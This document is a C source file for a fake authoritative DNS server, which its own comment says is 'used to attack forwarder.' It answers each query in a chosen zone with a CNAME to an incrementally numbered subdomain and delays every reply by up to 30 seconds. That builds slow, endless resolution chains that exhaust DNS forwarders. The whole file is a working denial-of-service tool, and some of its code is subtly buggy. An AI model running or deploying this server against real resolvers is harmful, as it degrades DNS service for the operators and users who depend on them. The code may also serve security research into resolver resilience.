/*
    A fake DNS server used to attack forwarder.
*/

#include "util.h"
#include "network.h"
#include "dns.h"
#include "common.h"

unsigned int  g_sock_timeout     = 10;      // Timeout (seconds) of socket.
uint16_t      g_dns_port         = 53;      // DNS port used by DNS.

char*               g_domain_zone;
char*               g_ns_domain;

/* Param for worker thread. */
struct worker_param {
    int sockfd;
    struct sockaddr_in* clientaddr;
    uint8_t* data;
    size_t data_len;
};

/* Parse domain for number. */
static unsigned long parse_domain_num (char *domain) {
    char num_str[16] = {0};
    unsigned long num;
    
    if (sscanf(domain, "%[0-9]", num_str) > 0)
        sscanf(num_str, "%ld", &num);
    else
        num = 0;
    
    return num;
}

/* Sleep and incres time gap. */
static void resp_gap(char *domain) {
    unsigned long num = parse_domain_num(domain);
    if (num * 3 > 30)
        sleep(30);
    else
        sleep(num * 3);
}

/* Copy and store params. */
static struct worker_param* new_worker_param(int sockfd, struct sockaddr_in* clientaddr, uint8_t* data, size_t data_len) {
    struct worker_param* ret = (struct worker_param*)alloc_memory(sizeof(struct worker_param));
    ret->sockfd = sockfd;
    ret->clientaddr = (struct sockaddr_in*)alloc_memory(sizeof(struct sockaddr_in));
    memcpy(ret->clientaddr, clientaddr, sizeof(struct sockaddr_in));
    ret->data = (uint8_t*)alloc_memory(data_len);
    memcpy(ret->data, data, data_len);
    ret->data_len = data_len;
    return ret;
}

/* Free a worker_param. */
static void free_worker_param(struct worker_param* param) {
    free(param->clientaddr);
    free(param->data);
    free(param);
}

/* Make a new DNS packet for response. */
static size_t make_dns_resp_pkt_cname(uint8_t* outbuf, size_t outbuf_len, struct dnshdr* dns_req, size_t dns_req_len,
        char* cname_res) {
    if (outbuf_len < dns_req_len)
        return -1;
    
    char* req_domain = (char*)alloc_memory(128);
    parse_dns_req_domain(req_domain, 128, dns_req, dns_req_len);
    
    // Make DNS packet.
    struct dns_query* query[1];
    struct dns_answer* answer[1];
    struct dns_answer* authori[1];
    query[0] = new_dns_query_a(req_domain);
    answer[0] = new_dns_answer_cname(req_domain, cname_res, 10);
    authori[0] = new_dns_answer_ns(g_domain_zone, g_ns_domain, RES_TTL);
    size_t packet_len = make_dns_packet(outbuf, outbuf_len, TRUE, ntohs(dns_req->id), query, 1, answer, 1, authori, 1, TRUE);

    free(req_domain);
    return packet_len;
}

/* Handle incoming DNS request. */
static void handle_request(int sockfd, struct sockaddr_in* clientaddr, uint8_t* data, size_t data_len) {
    struct dnshdr* dnsh = (struct dnshdr*)data;
    struct dns_query* query = (struct dns_query*)(dnsh + sizeof(struct dnshdr));
    char* domain = (char*)alloc_memory(128);
    char* subdomain = (char*)alloc_memory(256);
    char sublevel[16];
    struct dnshdr* dns_resp = (struct dnshdr*)alloc_memory(DNS_PKT_MAX_LEN);

    // Parse requested domain.
    parse_dns_req_domain(domain, 128, dnsh, data_len);

    // Filter something out;
    if (!domain_is_in_zone(domain, g_domain_zone))
        goto handle_request_ret;

    // Get subdomain to respond.
    sprintf(sublevel, "%ld", parse_domain_num(domain) + 1);
    domain_sublevel(subdomain, 256, g_domain_zone, sublevel);

    // Make response.
    size_t resp_len = make_dns_resp_pkt_cname((uint8_t*)dns_resp, DNS_PKT_MAX_LEN, (struct dnshdr*)data, data_len, subdomain);

    // Time gap.
    resp_gap(domain);

    // Send response.
    sendto(sockfd, dns_resp, resp_len, 0, (struct sockaddr*)clientaddr, sizeof(struct sockaddr_in));

handle_request_ret:
    free(subdomain);
    free(domain);
    free(dns_resp);
}

/* Work thread. */
static void* handle_request_thread(void* param) {
    struct worker_param* p = (struct worker_param*)param;
    handle_request(p->sockfd, p->clientaddr, p->data, p->data_len);
    free_worker_param(p);
}

/* Run fake DNS server. */
static void serve(uint32_t listen_addr, char* domain_zone, char* ns_domain) {
    g_domain_zone = domain_zone;
    g_ns_domain = ns_domain;

    int sockfd = make_sockfd_for_dns(g_sock_timeout);
    uint8_t* recv_buf = (uint8_t*)alloc_memory(512);
    struct sockaddr_in serveraddr;
    struct sockaddr_in clientaddr;

    // Set sockaddr_in for server.
    memset(&serveraddr, 0, sizeof(struct sockaddr_in));
    serveraddr.sin_family = AF_INET;
    serveraddr.sin_addr.s_addr = htonl(listen_addr);
    serveraddr.sin_port = htons(g_dns_port);

    if (bind(sockfd, (struct sockaddr*)&serveraddr, sizeof(serveraddr)) < 0) {
        printf("[ - ] Fail to bind.\n");
        abort();
    }

    int clientlen = sizeof(clientaddr);
    size_t buf_len;
    pthread_t thread_tmp;

    // Recv loop.
    while(TRUE) {
        buf_len = recvfrom(sockfd, recv_buf, 512, 0,(struct sockaddr*)&clientaddr, &clientlen);
        if (buf_len < 0) {
            printf("[ - ] Fail to recv.\n");
            abort();
        } else if (buf_len > 512) {
            printf("[ * ] Request got, but the length is bigger than 512 bytes.\n");
        } else {
            printf("[ * ] Request got.\n");
            pthread_create(&thread_tmp, NULL, handle_request_thread, new_worker_param(sockfd, &clientaddr, recv_buf, buf_len));
        }
    }

    close(sockfd);
    free(recv_buf);
}

int main(int argc, char** argv) {
    int ch;
    char* listen_addr = NULL;
    char* domain_zone = NULL;
    char* ns_domain = NULL;

    while ((ch = getopt(argc, argv, "l:z:n:")) != -1) {
        switch (ch) {
        case 'l':
            listen_addr = optarg;
            break;
        case 'z':
            domain_zone = optarg;
            break;
        case 'n':
            ns_domain = optarg;
            break;
        default:
            printf("Unknown arg\n");
            return 1;
        }
    }

    if (listen_addr == NULL || domain_zone == NULL || ns_domain == NULL) {
        printf("Usage:\n");
        printf("./delayns -l <listen_addr> -z <domain_zone> -n <ns_domain>\n");
        return 1;
    }

    serve(inet_addr(listen_addr), domain_zone, ns_domain);

    return 0;
}
